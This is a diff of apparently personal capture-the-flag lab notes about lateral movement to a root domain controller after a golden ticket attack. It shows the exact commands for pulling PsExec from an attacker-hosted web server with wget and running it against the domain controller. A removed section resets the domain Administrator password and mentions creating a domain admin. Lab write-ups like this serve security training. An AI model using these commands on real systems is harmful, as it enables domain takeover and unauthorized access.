@@ -83,7 +83,7 @@ https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 
 - Unzip the file.
 - Start a python http server on you attacking machine in the directory where you unzipped pstools.
-- Get psexec.exe from the shell on the ROOTCD machine.
+- Get psexec.exe from the powershell on the ROOTCD machine.
 	PS C:\Users\Administrator> `wget http://10.50.110.16:8000/PsExec.exe -o psexec.exe`
 
 ### PowerShell session in ROOTDC
@@ -97,8 +97,7 @@ PS C:\Users\Administrator> `.\psexec.exe \\rootdc.thereserve.loc cmd.exe`
 ![[Golden Ticket Attack with mimikatz-20240609134803204.webp]]
 ![[Golden Ticket Attack with mimikatz-20240609134915452.webp]]
 
-<span style="background:#d4b106">### Changed the administrator password for ROOTDC</span>
+## Authenticate the flag on e-citizen
 
-<span style="background:#d4b106">C:\Windows\system32>`powershell.exe -c Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset`</span>
+[[Flag Submission Process]]
 
-<span style="background:#d4b106">rdp into ROOTDC with the new creds.. created a domain admin user for BankDC. Rdp into BankDC.</span>
